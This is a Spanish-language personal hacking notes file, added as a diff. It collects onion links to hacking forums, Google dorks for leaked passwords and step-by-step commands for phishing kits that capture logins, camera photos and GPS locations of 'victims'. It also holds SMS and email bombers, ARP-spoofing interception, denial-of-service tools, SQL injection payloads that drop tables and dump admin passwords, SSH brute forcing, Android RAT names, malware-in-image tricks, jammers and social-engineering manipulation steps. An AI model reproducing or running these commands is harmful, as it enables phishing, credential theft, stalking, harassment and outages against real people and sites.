@@ -1,0 +1,1460 @@
+///////////////////////////////////////////////////////////////2024-12-12/////////////
+//////////////////LINKS CON INFORMACION IMPORTANTE///////////////////////////////////////
+/////////////////////////////////////////////////////////Sebastian Guevara Sanchez///
+
+Colombia
+www.colpensiones.gov.co
+www.fosyga.in/fosyga/
+
+https://dnsdumpster.com/          // verificar vulnerabilidades de una pagina web
+https://www.cual-es-mi-ip.net/geolocalizar-ip-mapa
+https://www.ipfingerprints.com/
+nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
+
+Cobertura de una red de telefonia claro https://www.claro.com.co/personas/soporte/mapas-de-cobertura/
+Cobertura de una red de telefonia Movistarhttps://www.movistar.com.co/mapa-de-cobertura-movil
+bases militares https://www.datos.gov.co/Seguridad-y-Defensa/ZONAS-Y-DISTRITOS-MILITARES-DE-COLOMBIA/jpus-ug29 
+espectro electromagnetico en colombia con mapa http://conalespec.ane.gov.co:8084/               
+mapa de antenas en colombia http://medicionantenas.ane.gov.co:82/#           
+Mapa de trafico en el mundo https://www.waze.com/es/livemap?utm_source=waze_website&utm_campaign=waze_website&utm_expid=.K6QI8s_pTz6FfRdYRPpI3A.0&utm_referrer=      
+Detecto de radares moviles o radares fijos  http://www.radarbot.com/    
+Emisoras en colombia por el ministerio tic https://www.mintic.gov.co/portal/maparadio/631/w3-channel.html 
+Contraseñas de aeropuerto https://ensedeciencia.com/2021/03/15/lista-de-contrasenas-wi-fi-de-todos-los-aeropuertos-del-mundo/?fbclid=IwAR0RJmuXj-_fQV89L8lWoZfCk-mY0g5nhxGG0gG8mJslFxCQan4TPMbKBa8
+Significado y raiz de los apellidos https://www.familysearch.org/es/surname
+Bibliotega de geneologica de colombia https://www.academiadegenealogia.org/biblioteca-juan-florez-ocariz
+Mapas de hackeo en vivo https://hackersonlineclub.com/live-cyber-attack-maps/?fbclid=IwAR2WnlsQe48Pa2E9TxNaUnjcrvrT7iZ7LgFC843wMHLHOsiPwRaejZkdV-w
+Frecuencias de uso libre en colombia https://normograma.mintic.gov.co/mintic/docs/resolucion_ane_0711_2016.html
+
+----------------------------------------------------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////DEEP WEB///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+LINKS
+http://oniot2zvfczp4lpc.onion/cat4/
+
+CHAT Y RED SOCIAL
+http://connectkjsazkwud.onion/register
+http://galaxy3bhpzxecbywoa2j4tg43muepnhfalars4cce3fcx46qlc6t3id.onion/?offset=25#
+http://tetatl6umgbmtv27.onion/
+
+Dirección onion: https://wwhclublci77vnbi.onion/
+
+FOROS DE HACKING
+http://verified2ebdpvms.onion/
+https://forum.exploit.in/
+http://crdclub4wraumez4.onion/
+https://probiv7jg46vmbox.onion/
+http://damagelabo2jiykj.onion/
+
+--------------------------------------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////BUSQUEDAS EN GOOGLE DE VULNERABILIDADES///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+
+PROXYS PARA ANONIMATO
+http://kproxy.com/
+https://www.proxysite.com/es/
+https://hidester.com/es/proxy/
+https://hide.me/en/proxy
+https://www.vpnbook.com/webproxy
+https://www.adslzone.net/reportajes/internet/mejores-proxy-gratis/
+
+
+BUSQUEDAS EN GOOGLE
+* inurl:webarch/mainframe.cgi                      //Impresoras
+* intitle:"network print server" filetype:shtm     //impresoras
+* allintitle:restricted filetype:doc site:gov      //Sitios restringidos , se puede cambiar restricted por "top secret" o "confidential", "doc","pdf", "txt"
+* passwords|contraseñas|login|contraseña filetype:txt site:Web.com     //contraseñas, logins en documentos txt , tambien se puede cambiar el txt
+*"index of"/"chat/logs"                            //logs de chats almacenados en servidores
+*"Microsoft (R) Windows * (TM) Version * DrWtsn32 Copyright (C)" ext:log       //Procesos ejecutandose en el servidor para ver antivirus o firewall
+*inurl:":8080"  -intext:8080                       //servidores que tienen activo el puerto 8080 en este caso
+*intitle:index.of wd_ftp.log                       //Log de acceso por FTP
+*intitle:"the page cannot be found""please**following""internet*Services"   //permite saber el tipo de servidor
+*  site : * .google.com                             // buscar todo lo relacionado con google.com
+
+
+----------------------------------------------------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////GEOLOCALIZACION DE DISPOSITIVOS ///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+https://www.cual-es-mi-ip.net/geolocalizar-ip-mapa
+https://www.ipfingerprints.com/
+https://www.infosniper.net/
+https://www.iplocation.net/
+
+GRABIFY //crea un link el cual nos informa la ip de la victima que abrio el link
+https://grabify.link/
+https://www.youtube.com/watch?v=kthkKtEu3Y0
+https://grabify.link/track/BRGB42   //link de la cancion dame un kiss	
+BRGB42
+
+CREEPY //GeoLocalizacion de twitter - pide cuenta de twitter y se puede en windows
+http://www.geocreepy.com/?fbclid=IwAR3OMEED87H5zDwDRGpBLeKM8XIxOglLgjvDupL6LV6hJ8fAM5ZhbfkTIgA
+Usar Creepy: https://www.youtube.com/watch?v=z21yVEB9pnQ
+http://antisec-security.blogspot.com/2014/02/creepy-el-retorno-del-la-geolocalizacion.html?fbclid=IwAR0mQX7FB14YVcrZzAzKRwxanZU2snIIWeVAix07slDkci1RDbyJltkGeNs
+
+SEEKER //pide que se active el GPS del dispositivo
+Script que arroja un link con el cual uno puede ver la ubicacion del que lo abre y acepta el activar el GPS
+https://esgeeks.com/seeker-geolocalizacion-de-dispositivos/?fbclid=IwAR0g2L74RIjA1SUR2szbXjVCrMV63Q1uBrHm_Dx0Ec4GNn1IjJYwtrjj2_o
+
+TELEGRAM //se hace una llamada por este medio y luego en wiresharp se ingresan estos filtros
+stun or stun.att.username or stun.att.ipv4-xord or stun.att.ipv4
+
+https://github.com/Greenwolf/social_mapper   //ver correos asociados a un twitter
+https://tinfoleak.com/   //Ver cuantas personas manejan un twitter
+https://www.youtube.com/watch?v=K0dlNLfbReI    // Cambiar la ip publica
+ FamiSafe  // Rastrear ubicacion y poder bloquear aplicaciones a distancia
+https://www.spoofbox.com/es  // Spoofing a Sms, correo, telefono, computador o impresora
+
+Phishing y GPS  // R4VEN
+git clone https://github.com/spyboy-productions/r4ven.git
+cd r4ven
+pip3 install -r requirements.txt
+python3 r4ven.py
+
+-------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////WEB SHELL ///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
+tracert -d google.com
+https://dnsdumpster.com/            //Informacion de servidores de un dominio https://twitter.com/hackertarget/
+InSSIDer       //con este programa se pueden ver las direcciones mac de los routers.
+
+///Para habilitar auditoria y ver los inicios de sesion
+gpedit.msc   //Conf windows, confg de seguridad, directiva locales, directivas de auditoria
+eventvwr.msc  //registro de win, seguridad
+
+--------------------------------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////VER CORREOS E IP DE UN SERVIDOR ///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+haveibeenpwned.com.
+https://www.youtube.com/watch?v=picZ4rGZq4k&feature=youtu.be&fbclid=IwAR1xycpxzMFh5nLugR4gTqtATw67fSpeFPtuVPVfXbAmn5ch_QeF-nNMNMg
+https://github.com/m4ll0k/Infoga
+http://www.cursodehackers.com/ManInTheMiddle.html
+
+----------------------------------------------------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////CRIPTOGRAFIA Y ESTEGANOGRAFIA ///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+
+//////DEEPFAKE - Crear videos de una imagen fija
+https://colab.research.google.com/github/AwaleSajil/DeepFake_1/blob/master/first_order_model_demo(Youtube)_new_audioV5_a.ipynb#scrollTo=tQB-Dv8ByURc
+https://github.com/AliaksandrSiarohin/first-order-model
+https://www.xatakandroid.com/listas/cinco-aplicaciones-para-crear-divertidos-deepfakes-android
+
+///// ESTEGANOGRAFIA 
+//se ingresa una imagen y el documento en un mismo archivo y el documento se mete en un RAR luego se abre consola y se ingresa este codigo
+COPY/B nombreimagen.png + nombrearchivorar.rar nombredelanuevaimagen.png
+
+ESTEGANOGRAFIA EN AUDIOS
+https://noticiasseguridad.com/tutoriales/transferir-cualquier-dato-confidencial-mediante-el-sonido-usando-deepsound/?fbclid=IwAR3KvIeB-lVp1FU-Nq6S3O-rct26NKccVItA2dnJzcagmXTIbcgkOa4D-0M
+
+ESTEGANOGRAFOS MAS USADOS
+https://noticiasseguridad.com/tutoriales/las-6-mejores-herramientas-gratuitas-de-esteganografia-para-profesionales-de-ciberseguridad/?fbclid=IwAR0ujbKsSnudTri3QwGscpTpzpS3BtHi_LB_CK8o48ZxA8K7G0iURcE75V0
+
+GUARDAR VIRUS EN UNA IMAGEN con HxD Hex Editor HxD y Winrar Archiver
+https://noticiasseguridad.com/tutoriales/como-disfrazar-un-malware-como-txt-jpeg-o-cualquier-formato-de-archivo-en-6-sencillos-pasos/?fbclid=IwAR3tFdpggobciIZ9xRfOsdruF9Be3gbWSFyUX1mkrXv24OZQO9lj05f-NGk
+------------------------------------------------------------------------
+///////////////////////////////////////////////////////////////////////////////////////////
+///////////////////INGENIERIA SOCIAL ///////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////
+
+1) INGENIERIA SOCIAL:
+por medio del carisma y las relaciones obtener informacion sobre la victima
+
+2)INGENIERIA SOCIAL INVERSA
+crea la necesidad y luego vende el producto
+ejemplo: compre el seguro anti robo, hay muchos ladrones por aqui
+
+3)INGENIERIA SOCIAL OSINT
+recolectar informacion en internet de la victima
+
+4)INGENIERIA SOCIAL SIN TECNOLOGIA
+seguir a la persona, anotaciones de su comportamiento, rutina, horario laboral
+1 Base - Utilizar la voluntad de ayudar de tu objetivo.
+2 Base - Ganarnos la confianza de nuestro objetivo.
+3 Base - Aprovechar que a las personas les cuesta decir que no
+4 Base - Subir el Ego de tu objetivo.
+5 Base - Demostrar interés por tu objetivo.
+6 Base - Empatizar a través del buen humor, la sonrisa
+7 Base - Llamar a tu objetivo por su nombre
+8 Base - Inducir al objetivo a que hable de si mismo.
+9 Base - Dirigir la conversación en base a lo que predecimos de su interés.
+10 Base - Hacer sentir importante al objetivo.
+11 Base - Ofenderte.
+12 Base - Utilizar las personas del entorno
+
+
+---------------------------------------------------------------------------
+Detector de camara:
+Spy Camera Detector – https://play.google.com/store/apps/details?id=com.trackapps.hiddencameradetected
+Hidden Camera – https://play.google.com/store/apps/details?id=com.softmaticsoft.hiddencameradetectorspysecret
+Hidden Camera Detector – https://play.google.com/store/apps/details?id=hiddencamdetector.futureapps.com.hiddencamdetector
+
+ANDRILLER
+DRFONE WONDERSHARE
+SPY NOTE
+ANDRORAT
+AHMYTH
+DROIDJACK  - cuesta
+REPTILICUS  - cuesta
+
+CREAR JAMMER DE WIFI CON SOFTWARE LIBRE https://noticiasseguridad.com/tutoriales/venga-a-tus-vecinos-bloqueando-cualquier-wifi-en-una-cuadra-3-formas-de-crear-un-jammer-wifi-sin-hardware/?fbclid=IwAR01mymn4NDvC9zRog34bprcqDbgNbXwAefP_VnN_UOTjG8737ogniBMwqQ
+----------------------------------------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+//////INHIBIDOR DE FRECUENCIAS GPS DE 1000Mhz Y 1500Mhz Y DERRIBADOR DE DRONES  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+https://www.xdrones.es/inhibidor-de-frecuencia-casero-derribar-drones-inhibidor-gps/
+GUIA PARA HACKEAR DRON https://www.xdrones.es/guia-para-hackear-el-ar-drone-2-0/
+https://www.google.com/search?q=inhibidor+de+microondas&rlz=1C1SQJL_esCO872CO872&oq=inhibidor+de+microondas&aqs=chrome..69i57.9496j1j7&sourceid=chrome&ie=UTF-8
+
+////JAMMER DE BLOUTUBE DESDE UN CELULAR
+https://noticiasseguridad.com/tutoriales/cobre-venganza-de-sus-vecinos-ruidosos-saboteando-sus-bocinas-bluetooth-como-crear-un-bluetooth-jammer-con-solo-9-comandos-y-sin-hardware-especial/?fbclid=IwAR1XOruPVwjShfh7SNxa6OcTvCMLSqjtazRwu_vdxuJbMSK60mJA1OpJ6eE
+
+////PISTOLA DE ELECTROMAGNETISMO
+https://www.youtube.com/watch?v=l_U5_NhLck8
+
+---------------------------------------------------------------------------------------
+
+////////////////////////////////////////////////////////////////////////////////////////////
+//////TIENDAS DE INTERCEPTACION E INHIBICION DE EL ESPECTRO ELECTROMAGNETICO  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+https://www.thespyphone.com/
+https://www.intercept.ws/
+https://www.contrainteligencia.com/
+https://www.mollitiamindustries.com/
+
+Mejores programas para espiar android, iphon y computador
+https://www.adslzone.net/listas/mejores-programas/espiar-pc/
+
+/////TIENDA DE ARTEFACTOS ESPIA
+https://www.tacticalsecurity.net/
+Estos artefactos funcionan en un rango de 300 megahercios a 3 gigahercios (UHF) o en GSM 3G y 4G graban rango de 50mts- a 180mts
+https://www.todoelectronica.com/es/534-espionaje-y-contraespionaje
+
+/////TIENDA DE ESCANERS DE ARTEFACTOS ELECTRONICOS
+https://www.jjndigital.com/products/edd-24t/
+
+------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// OSINT O BUSCAR INFORMACION DE UNA PERSONA EN INTERNET  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+OSRFRAMEWORK
+git clone https://github.com/i3visio/osrframework
+cd osrframework/
+pip3 install osrframework
+alias_generator.py  //para buscar por alias
+domainfy.py -n google -o google  //busca el dominio google y lo almacena en google
+mailfy.py -n nandu -o nandu // busca el correo electronico y lo almacena en nandu
+searchfy.py -q “ravi” -o ravi  //busca los url que tienes ravi y lo almacena en ravi
+
+https://noticiasseguridad.com/tutoriales/encuentre-a-cualquier-persona-en-internet-usando-esta-herramienta/
+
+WEBMII.COM  //buscar por nombre de persona
+https://yandex.com/    //buscar por foto de persona 
+https://esgeeks.com/eagleeye-perfiles-redes-sociales-por-imagen/    //buscar por foto de persona 
+
+https://infotracer.com/     // Buscar por correo, nombre, numero de celular, en USA
+http://verifyphonenumbers.com/   //Busqueda de informacion por numero de celular en USA
+https://validnumber.com/     //Busqueda de informacion por numero de celular en USA
+
+------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// SPAM DE SMS O CORREO  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+GOD-KILLER   //funciona 1 vez por dia y se puede anexar link en el mensaje
+git clone https://github.com/FDX100/GOD-KILLER.git 
+cd GOD-KILLER
+python install.py
+./GOD-KILLER
++57
+<numero victima>
+<mensaje que ira hacia la victima>
+
+
+TBOMB  // solo envia 1 mensajes a una victima
+git clone https://github.com/TheSpeedX/TBomb.git           
+cd TBomb
+chmod +x TBomb.sh
+./TBomb.sh
+1
+<IndicativoReginoalVictima>
+<NumeroVictima>
+https://www.youtube.com/watch?v=CNO1H5P8VEY       // Spam de mensajes
+
+
+SPAMMER-GRAB  //PIDE USUARIO Y CONTRASEÑA DE GITHUB
+git clone https://github.com/Noxturnix/Spammer-Grab 
+cd Spammer-Grab 
+chmod +x auto-install.sh
+./auto-install.sh 
+chmod +x spammer.py
+python2 spammer.py –h //h les muestra los comandos
+Python2 spammer.py –delay 2 5918844747
+
+
+EMAIL-BOMBER: //Les pedira servidor del correo, Gmail o Yahoo 
+git clone https://github.com/zanyarjamal/Email-bomber.git 
+cd Email-bomber 
+python2 E-bomber.py 
+1
+//Les pedirá su correo depende a lo que pusiste arriba
+//Colocan su contraseña para logearse
+https://www.youtube.com/watch?v=9r6KtuIbrSw
+
+
+INSTASPAM  //no hay videos tutoriales
+git clone https://github.com/thelinuxchoice/instaspam.git 
+cd instaspam 
+chmod +x instaspam.sh 
+bash instaspam.sh ó ./instaspam.sh 
+
+
+PROGRAMAS QUE DAN UN MES GRATIS DE SPAM https://www.websitetooltester.com/es/blog/programas-para-enviar-correos-masivos/
+------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// PHISHIM  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+ZPHISHER //funciona
+git clone https://github.com/htr-tech/zphisher
+cd zphisher
+chmod +x zphisher.sh
+bash zphisher.sh
+1  //para seleccionar facebook
+2  //para que sea la pagina de login de facebook
+2  //que el link quede accesible desde afuera del dispositivo atacante
+https://noticiasseguridad.com/tutoriales/crear-paginas-de-phishing-de-29-sitios-en-pocos-minutos/
+
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en español
+
+CAMPHISH // captura foto de camara frontal de el dispositivo que ve el link
+git clone https://github.com/techchipnet/CamPhish
+cd CamPhish
+chmod +x camphish.sh
+./camphish.sh
+1 //puede ser 1 o 2
+2
+IUuUdXni1Zc  //copiamos de la url lo que va despues de watch=
+   ...  //el link que nos arroje se envia a la victima y este tomara fotos hasta que la victima deje de ver el video
+
+
+SHELLPHISH  //pishim de facebook y otros PIDE USUARIO DE GITHUB
+git clone https://github.com/thelinuxchoice/shellphish
+cd shellphish
+bash shellphish.sh
+choose an options: 2
+choose a port forwarding option: 1
+or using tinyurl :  //copiamos esta url y la enviamos a la victima
+
+
+SHELLPHISH
+1.- pkg install git
+
+2.
+- git clone 
+https://github.com/Pericena/shellphish.git
+3.
+- cd shellphish
+4.
+- chmod +x shellphish.sh
+5.
+- ./shellphish.sh
+6.
+- pkg install php
+7.
+- pkg install wget
+8.
+- pkg install curl
+9.
+- pkg install ssh
+10.
+- pkg install SSH
+11.
+- pkg install openssh
+12.
+- ./shellphish
+
+LOCKPHISH  //captura contraseña de un celular PIDE USUARIO Y CONTRASEÑA DE GITHUB
+git clone https://github.com/thelinuxchoice/lockphish
+cd lockphish
+bash lockphish.sh //luego genera el link donde la victima ingresara su contraseña de android, ios o windows
+https://www.youtube.com/watch?v=PTjP35heg7A
+
+
+ZEEKER  //me falta por probar, aparentemente muestra la ubicacion de la persona
+https://github.com/thewhiteh4t/seeker 
+
+HIDDENEYE //no me sirvio tenia que usar pip3 para la instalacion y no supe como
+git clone https://github.com/DarkSecDevelopers/HiddenEye    // Fishim
+cd HiddenEye
+python HiddenEye.py
+y
+8 //para instagra
+4
+your chouse : n
+redirrect here : www.google.com
+2  //para que el link sea de serveo
+your choose : 2
+https://www.youtube.com/watch?v=geOgikV76yk
+
+WIFIPHISHER  //requiere una antena usb
+git clone https://github.com/wifiphisher/wifiphisher      //con este programa se puede hacer fishin con el fin de obtener usuarios y contraseñas
+cd wifiphisher
+chmod +x setup.py
+sudo python setup.py install
+https://www.youtube.com/watch?v=EIF81nmHa1k
+
+EMAILSPOOFING  //no encontre videos de este programa
+git clone https://github.com/TermuxHacking000/EmailSpoofing
+
+scPH1S1N9
+
+Script Phising ,Facebook,Instagram //no hay videos de este programa
+apt update && apt upgrade
+apt install figlet
+
+apt install toilet
+
+gem install lolcat
+
+git clone https://github.com/InYourG00D1/scPH1S1N9
+
+cd scPH1S1N9
+
+sh PhisingV2.sh
+
+PHISHIN CON UBICACION GPS
+https://noticiasseguridad.com/tutoriales/como-crear-un-sitio-web-falso-para-obtener-la-ubicacion-gps-precisa-de-cualquier-usuario-en-ios-android-y-windows/?fbclid=IwAR2RFCDVUYmEoMw61Dwkw2IyfAAQq9JKK1bE-KjG-0P5XhDf8utu7s_nRe0
+
+
+---------------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// ATAQUES MITM - HOMBRE EN MEDIO PARA CAPTURAR INFORMACION Y CLAVES  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+WEBSPLOIT  //no funciono, el nuevo websploit 4.0 no tiene el modulo nerwork mitm
+apt-get install websploit
+websploit
+use network/mitm   //en kalilinux iniciamos websploit y luego escogemos esta opcion
+set router <ip del router>
+set target <ip victima>
+set sniffer drifnet    //Este es para ver las imagenes que la victima ve en el navegador
+set sniffer dnsiff     //Este sirve para guardar los links con logins que ve la victima se almacenan en sslstrip.log
+set sniffer urlsnarf   //muestra en consola los links que visita la victima
+run
+https://www.youtube.com/watch?v=3FEMV43iBeI
+https://www.youtube.com/watch?v=q5JLsWE2lXE  //websploit 4.0
+
+
+ETTERCAP + DRIFTNET  //tiene que ser el video del nuevo ettercap
+unfied snif  eth0   //abrimos ettercap y escogemos el snif y seleccionamos et0
+scan for host
+host list 
+add target 1 <ip propia>  //ip victima tambien
+add target 2 <ip victima>
+arp poisoning
+sniff remote 
+star sniffing
+drifnet    //en consola ponemos drifnet para ver las imagenes que esta viendo la victima
+
+
+MITMF//no reconoce el bash luego dela descarga
+apt-get install mitmf
+mitmf --hsts --arp --spoof -i eth0 --target <ip victima> --gateway <ip router> //puede ser este codigo o el de abajo
+mitmf -i wla0 --spoof --arp --gateway <ip router> --responder --wpad
+
+
+ARPSPOOF  //no reconoce el arpspoof como bash en kalilinux, depronto hay que descargarlo
+sysctl -w net.ipv4.ip_forward=1   //habilita el reenvio de paquetes en linux
+arpspoof -i wlan0 -t <IP Victim> <IP Router>
+driftnet -i wlan0   //ver imagenes del navegador de la victima
+urlsnarf -i wlan0   //ver las url que visita el navegador de la victima
+driftnet -i wlan0 -t <ip victima> <ip router> 
+sysctl -w net.ipv4.ip_forward=0   //desactiva el reenvio de paquetes
+
+
+BETTERCAP  //aparentemente se puede ver https
+apt-get install build-essential ruby-dev libpcap-dev
+git clone https://github.com/evilsocket/bettercap
+cd bettercap
+gem build bettercap.gemspec
+gem install bettercap*.gem
+bettercap
+bettercap -T --proxy -P POST    //para ve el trafico en la red 
+bettercap -T <IP VÍCTIMA> --proxy -P POST  //para ver el trafico en un dispositivo en especial
+
+
+---------------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// ATAQUES DE DENEGACION DE SERVICIOS - TUMBAR PAGINA WEB  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
+
+apt-get install tor
+service tor start
+service tor status
+en mozilla vamos a preferencias buscamos proxy y escogemos manuel y en sock ponemos 127.0.0.1 y en port 9050
+PING DE LA MUERTE: //no me funciono tumbando mi propio servidor web
+ping <IP Address> -l 65500 -w 1 -n 1
+ping <IP Address> -t -l 15000
+
+SLOWLORIS : 
+git clone https://github.com/gkbrk/slowloris.git
+python slowloris.py 192.168.0.104 -s 5000      //Con este codigo usando la ip de la pagina mas un socket de 5000 se puede tumbar servicio web
+
+DDos-Attack:
+git clone https://github.com/Ha3MrX/DDos-Attack
+python ddos-attack.py
+
+DDos-Tor:
+git clone https://github.com/thelinuxchoice/ddostor
+bash ddostor.sh   //luego de descargar el git se ingresa a la pagina descargada y corremos la aplicacion con este codigo
+
+SLOWHTTPTEST: apt install slowhttpest
+
+HAMMER 
+git clone https://github.com/cyweb/hammer.git
+cd hammer
+python hammer.py
+python hammer.py -s <ipvictima>
+https://www.youtube.com/watch?v=MK4f69u40Bg
+https://youtu.be/nyzgorFnp8o
+
+SC DDOS SNIPER BLACKHAT TERSAKITI 
+git clone https://github.com/MrTamfanX/MCIDDOS
+
+cd MCIDDOS
+
+ls 
+
+python TamfanDdos.py
+
+python TamfanDdos.py [IP Target] [8080] [100000]
+
+dost-attack
+
+ //pide user name para poderlo descargar
+git clone https://github.com/verluchie/dost-attack
+
+cd dost-attack
+
+chmod 777 dost
+
+./install.sh
+
+dost
+
+XERXES: 
+apt install clang 
+git clone https://github.com/zanyarjamal/xerxes 
+cd xerxes 
+clang xerxes.c -o xerxes 
+./xerxes website 80 
+
+
+HULK
+Git clone https://github.com/grafov/hulk.git 
+Cd hulk 
+Python2 hull.py -site http://example.com/test/ 2>/dev/null
+
+METASPLOIT
+msfconsole
+use /auxiliary/dos/tcp/synflood
+set RHOST <ip victima>
+exploit
+
+ATAQUE DOS CON EXPLOIT DESDE KALILINUX 
+python <nombredelExploit.py> <ipdelavictima> <32 o 64>  //En la carpeta donde esta el exploit de DDOS
+
+DOSER, se descarga y luego se da doble click en el archivo
+http://www.mediafire.com/file/me38jmg...
+clave: ck4
+
+ATAQUE DDOS CONTRA UN COMPUTADOR CONECTADO A LA RED //confirmar si es .efe o .ef
+if(ip.src == '<ip victima>' || ip.dst == '<ip victima>')
+{drop();
+kill();
+msg("Dos attack \n");}     //Se crea un bloc de notas con este codigo y se le pone nombre "dos.elt"
+etterfilter dos.elt -o dos.ef  //esto se hace donde esta guardado el documento
+ettercap -i wlan0 -T -q -F dos.ef -M ARP ////  //se explota la vulnerabilidad y la victima no tendra mas internet.
+
+
+------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// SQL INJECTION  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+
+'            //si tecleamos esta coma simple en la url de una pagina web y nos sale en la pagina un error es porque es vulnerable
+'or'1'='1    // Esta sentencia se pone en el login de una BD y puede abrir la BD
+'or 1=1--    //TAMBIEN HAY UNAS PAGINAS QUE RECIBEN LA SENTENCIA SIN LA COMILLA INICIAL
+and 1=1
+Admin '--  //Con esta sentencia en el espacio de usuario intentamos entrar como admin
+'or 1=1--  //esta sentencia va en el espacio de contraseña
+'or          //solo con el or podemos verificar el nombre de una tabla
+';DROP TABLE NOMBREDETABLA   // con esta linea podemos borrar la tabla NOMBREDETABLA aprovechando la vulnerabilidad  
+
+///////////////
+
+order by 15--  // Esta sentencia se pone en el link de la pagina y puede cambiar el numero 
+union all select 1,2,3, 15-- //se ponen los numeros hasta que llegue al valor donde siga mostrando contenido, 
+                             //en pantalla aparece un numero en donde hay vulnerabilidad de sqlinjection
+union all select 1,2,@@version, 15--   //luego de saber donde esta la vuln se pone el @@version para ver la version
+union all select 1,2,group_concat(table_name),9,10,15 from information_schema.tables where table_schema=database()--
+                              //la sentencia anterior es para saber los nombres de las tablas que acompañan a "information_schema.tables"
+union all select 1,2,group_concat(column_name),9,10,15 from information_schema.columns where table_schema=database()--
+                              //la sentencia anterior es para saber los nombres de las columnas que acompañan a "information_schema.tables"
+union all select 1,2,group_concat(ru_Admin_Username,0x3a,ru_Admin_Password),9,10,15 from ru_Admin
+                              //la sentencia anterior es paa ver la contraseña del usuario admin
+///////////////////
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en español
+sudo apt-get update
+sudo apt install net-tools
+nslookup paginaweb.com     //Con este codigo en la consola de kali linux podemos ver la ip publica de una pagina
+
+
+sudo apt-get install tor  //para instalar tor en kalilinux para mejorar el anonimate
+sudo nano /etc/proxychains.conf   // ese "/etc/proxychains.conf" es la localizacion del archivo proxy y el loalpad es para editarlo
+dynamic_chain  //se le quita el comentario a dynamic
+#strict_chain   //se le pone comentario
+socks5 127.0.0.1 9050   // este codigo lo ponemos al final del programa luego de los comentarios con 
+sudo service tor start // esto se pone en la consola de kalilinux para mantener el anonimato igualmente el proxychain es para el anonimato
+sudo service tor status
+sudo service tor restart
+proxychains firefox http://www.cualesmiip.com/   //antes de abrir cada pagina hay que poner el proxichains 
+
+proxychains sqliv -d "inurl:index.php?id=" -e google  //En la consola de kalilinux con este codigo buscamos las bd con esa vulnerabilidad
+                                                      //o lo podemos buscar en un navegador como "inurl:index.php?id="
+                                                       //cuando encontremos una pagina con esta vulnerabilidad podemos ponerle una comilla simple en la URL para confirmar
+
+proxychains sqlmap -u http://www.paginaweb.com/basededatos --dbs  //este comando en kalilinux sirve para ver las bd en esa pagina web
+proxychains sqlmap -u http://www.paginaweb.com/basededatos -D nombre_bd --tables //cuando ya tenemos el nombre de la bd con este comando vemos sus tablas
+proxychains sqlmap -u http://www.paginaweb.com/basededatos -D nombre_bd -T usuario --columns // es para ver las columnas dentro de la tabla usuario
+proxychains sqlmap -u http://www.paginaweb.com/basededatos -D nombre_bd -T usuario -C usuario,contraseña --dump //Es para ver los datos que estan en usuario y contraseña
+ 
+https://www.hackers.tools/2016/02/lista-de-paginas-vulnerables-inyeccion.html  //paginas que tienen vulnerabilidades
+
+/////////// XSS
+
+<script>alert();</script>      //esto se puede poner en el usuario de una pagina y generar una pantalla de alerta
+><script>alert('x');</script><   //si el primero no funciona quizas funcione este
+
+https://www.youtube.com/watch?v=EHmDkTb2hW0     //Eyes of Network 5.1
+
+//////////THEHARVESTER
+subdominios, correos electronicos, puertos abiertos
+theHarvester -d dominio -l 50
+shodan.io
+
+------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// FUERZA BRUTA  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en español
+date "MMDDhhmmCCYY"
+date "081807472021"
+sudo apt-get update
+
+HYDRA, NCRACK, MEDUSA // fuerza bruta para ssh
+https://securityhacklabs.net/articulo/hacking-ssh-obteniendo-contrasenas-de-cualquier-servidor-mediante-fuerza-bruta
+
+////////CREACION DE DICCIONARIOS
+crunch <mincaracteres> <maxcaracter> <caracteresQueVanDentroDeLaContraseña> -o /home/Desktop/contraseña.txt
+crunch 8 8 1234567890abcdefghijklmnopqrstuvwxyz -o /home/kali/Desktop/contraseña.txt
+crunch 8 8 asdasdasd > /home/Desktop/contraseña.txt
+
+/////////FUERZA BRUTA DE SSH
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set blank_passwords true
+set pass_file /home/kali/Desktop/pass.txt
+set user_file /home/kali/Desktop/users.txt
+set rhosts <ipvictima>
+run
+https://www.youtube.com/watch?v=ivr-FiwlqBo
+
+msfconsole   //no me sirvio, no encuentra el usuario
+use auxiliary/scanner/ssh/ssh_enumusers //con este exploit encontramos un usuario
+set user_file /home/kali/Desktop/user.txt
+set verbose true
+set rhosts <ipvictima>
